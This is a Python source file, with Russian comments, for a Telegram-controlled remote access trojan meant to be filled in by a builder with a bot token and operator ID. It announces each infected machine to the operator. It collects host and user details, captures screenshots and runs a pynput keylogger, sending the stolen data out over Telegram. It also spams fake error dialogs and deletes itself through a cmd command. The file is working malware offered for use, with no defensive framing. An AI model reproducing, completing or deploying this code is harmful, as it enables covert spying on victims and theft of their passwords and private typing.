import os
import sys
import time
import socket
import platform
import subprocess
import threading
import tempfile
from datetime import datetime

import telebot
from telebot import types

# === ВШИТЫЕ ДАННЫЕ (заменяются билдером) ===
BOT_TOKEN = "{{BOT_TOKEN}}"
ADMIN_ID = "{{ADMIN_ID}}"
# ==========================================

bot = telebot.TeleBot(BOT_TOKEN)

def is_admin(message):
    return str(message.chat.id) == str(ADMIN_ID)

# --- СИСТЕМНАЯ ИНФА ---
def get_pc_info():
    try:
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        os_info = f"{platform.system()} {platform.release()} ({platform.version()})"
        user = os.getlogin()
        return (
            f"💻 *Данные ПК*\n"
            f"🖥 Хост: `{hostname}`\n"
            f"🌐 IP: `{ip}`\n"
            f"👤 Юзер: `{user}`\n"
            f"⚙️ ОС: `{os_info}`\n"
            f"🕒 Время: `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`"
        )
    except Exception as e:
        return f"Ошибка сбора инфы: {e}"

# --- СКРИНШОТ ---
def take_screenshot():
    try:
        from PIL import ImageGrab
        path = os.path.join(tempfile.gettempdir(), "shot.png")
        ImageGrab.grab().save(path)
        return path
    except Exception as e:
        return None

# --- КЕЙЛОГГЕР ---
keylog_buffer = ""
keylog_active = False

def start_keylogger():
    global keylog_active, keylog_buffer
    from pynput import keyboard
    keylog_active = True
    keylog_buffer = ""
    
    def on_press(key):
        global keylog_buffer
        if not keylog_active: return False
        try:
            keylog_buffer += key.char
        except AttributeError:
            if key == keyboard.Key.space: keylog_buffer += " "
            elif key == keyboard.Key.enter: keylog_buffer += "\n"
            elif key == keyboard.Key.backspace: keylog_buffer += "[BKSP]"
            elif key == keyboard.Key.tab: keylog_buffer += "[TAB]"
    
    listener = keyboard.Listener(on_press=on_press)
    listener.start()

def stop_keylogger():
    global keylog_active
    keylog_active = False
    return keylog_buffer

# --- GDI ВЗРЫВ (заглушка) ---
def gdi_explosion():
    for _ in range(50):
        try:
            import ctypes
            ctypes.windll.user32.MessageBoxW(0, "CRITICAL ERROR", "System", 0x10)
        except:
            pass
        time.sleep(0.05)

# --- САМОУНИЧТОЖЕНИЕ ---
def self_destruct():
    try:
        exe_path = sys.executable if getattr(sys, 'frozen', False) else __file__
        subprocess.Popen(f'cmd /c ping 127.0.0.1 -n 3 > nul & del /f /q "{exe_path}"', shell=True)
        sys.exit(0)
    except:
        sys.exit(0)

# --- КОМАНДЫ БОТА ---
@bot.message_handler(commands=['start'])
def cmd_start(message):
    if not is_admin(message): return
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    buttons = [
        "💻 Данные ПК", "📸 Скриншот",
        "⌨️ Кейлоггер ВКЛ", "⌨️ Кейлоггер ВЫКЛ",
        "💥 Взрыв винды", "💥 Самоуничтожение"
    ]
    markup.add(*[types.KeyboardButton(b) for b in buttons])
    bot.send_message(message.chat.id, "🪱 Клиент на связи. Выбирай:", reply_markup=markup)

@bot.message_handler(func=lambda m: is_admin(m))
def cmd_handler(message):
    text = message.text
    
    if text == "💻 Данные ПК":
        bot.reply_to(message, get_pc_info(), parse_mode="Markdown")
    
    elif text == "📸 Скриншот":
        path = take_screenshot()
        if path:
            with open(path, "rb") as f:
                bot.send_photo(message.chat.id, f, caption="📸 Скриншот")
            os.remove(path)
        else:
            bot.reply_to(message, "❌ Не удалось сделать скриншот.")
    
    elif text == "⌨️ Кейлоггер ВКЛ":
        start_keylogger()
        bot.reply_to(message, "⌨️ Кейлоггер запущен.")
    
    elif text == "⌨️ Кейлоггер ВЫКЛ":
        log = stop_keylogger()
        bot.reply_to(message, f"⌨️ Кейлоггер остановлен.\n\n`{log[:4000]}`", parse_mode="Markdown")
    
    elif text == "💥 Взрыв винды":
        bot.reply_to(message, "💥 Запуск GDI-эффекта...")
        threading.Thread(target=gdi_explosion, daemon=True).start()
    
    elif text == "💥 Самоуничтожение":
        bot.reply_to(message, "💥 Удаляю себя...")
        self_destruct()

if __name__ == "__main__":
    try:
        bot.send_message(
            ADMIN_ID, 
            f"🪱 *Клиент запущен!*\n"
            f"🖥 Хост: `{socket.gethostname()}`\n"
            f"👤 Юзер: `{os.getlogin()}`\n"
            f"🕒 {datetime.now().strftime('%H:%M:%S')}", 
            parse_mode="Markdown"
        )
        bot.infinity_polling(timeout=10, long_polling_timeout=5)
    except Exception:
        time.sleep(10)
        os.execl(sys.executable, sys.executable, *sys.argv)
